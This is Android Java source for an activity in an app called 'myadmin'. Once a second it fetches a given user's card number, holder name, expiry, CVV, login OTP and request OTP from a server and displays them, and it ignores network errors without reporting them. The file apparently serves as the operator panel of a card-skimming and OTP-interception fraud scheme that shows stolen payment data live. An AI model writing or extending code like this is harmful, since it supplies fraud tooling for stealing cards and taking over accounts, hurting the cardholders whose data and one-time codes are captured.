package com.myadmin.screens;

import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;

import com.google.gson.Gson;
import com.myadmin.R;
import com.myadmin.network.ApiClient;
import com.myadmin.network.ApiService;
import com.myadmin.model.UserDetailResponse;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class UserDetailActivity extends AppCompatActivity {

    TextView txtCardNumber, txtHolder, txtExpiry, txtCvv, txtLoginOtp, txtRequestOtp;

    Handler handler = new Handler(Looper.getMainLooper());
    Runnable refreshRunnable;

    String userId;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_user_detail);

        userId = getIntent().getStringExtra("user_id");

        txtCardNumber = findViewById(R.id.txtCardNumber);
        txtHolder = findViewById(R.id.txtHolder);
        txtExpiry = findViewById(R.id.txtExpiry);
        txtCvv = findViewById(R.id.txtCvv);
        txtLoginOtp = findViewById(R.id.txtLoginOtp);
        txtRequestOtp = findViewById(R.id.txtRequestOtp);

        refreshRunnable = new Runnable() {
            @Override
            public void run() {
                loadUserDetails();
                handler.postDelayed(this, 1000); // 🔁 every 1 second
            }
        };

        handler.post(refreshRunnable);
    }

    private void loadUserDetails() {
        SharedPreferences pref = getSharedPreferences("auth_info", MODE_PRIVATE);
        String userid = pref.getString("userid", "");
        String token  = pref.getString("token", "");

        String deviceId = Settings.Secure.getString(
                getContentResolver(),
                Settings.Secure.ANDROID_ID
        );
        ApiService apiService = ApiClient.getClient().create(ApiService.class);
        apiService.getUserDetail(userid, token, deviceId, userId).enqueue(new Callback<UserDetailResponse>() {
            @Override
            public void onResponse(Call<UserDetailResponse> call,
                                   Response<UserDetailResponse> response) {

                Log.d("API_CODE", "HTTP Code: " + response.code());

                if (!response.isSuccessful()) {
                    Log.e("API_ERROR", "Response not successful");
                    return;
                }

                if (response.body() == null) {
                    Log.e("API_ERROR", "Response body is null");
                    return;
                }

                Log.d("API_RAW", new Gson().toJson(response.body()));

                if (!response.body().status) {
                    Log.e("API_STATUS_FALSE", response.body().data.toString());
                    return;
                }

                if (response.body().data == null) {
                    Log.e("API_DATA", "Data is null");
                    return;
                }

                UserDetailResponse.UserData d = response.body().data;

                txtCardNumber.setText(valueOrEmpty(d.cardnumber));
                txtHolder.setText(valueOrEmpty(d.holdername));
                txtExpiry.setText(valueOrEmpty(d.expiry));
                txtCvv.setText(valueOrEmpty(d.cvv));
                txtLoginOtp.setText(valueOrEmpty(d.loginotp));
                txtRequestOtp.setText(valueOrEmpty(d.requestotp));
            }

            @Override
            public void onFailure(Call<UserDetailResponse> call, Throwable t) {
                // silent fail (no crash)
            }
        });
    }

    private String valueOrEmpty(String value) {
        return value == null ? "" : value;
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        handler.removeCallbacks(refreshRunnable);
    }
}
